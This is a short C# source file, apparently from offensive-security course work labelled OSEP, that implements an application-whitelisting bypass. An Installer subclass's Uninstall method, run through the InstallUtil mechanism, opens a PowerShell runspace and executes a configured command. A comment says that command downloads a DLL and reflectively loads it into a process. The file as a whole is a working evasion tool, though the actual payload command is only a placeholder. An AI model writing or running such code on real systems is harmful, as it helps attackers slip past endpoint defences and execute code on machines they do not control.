using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace OSEP
{
    class Entry
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Debug.RunDebug("\nUninstall bypass started.");


            //example download dll  and reflectively load it into a process.
            string cmd = $"{CONFIG.STATIC_COMMAND}";


            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}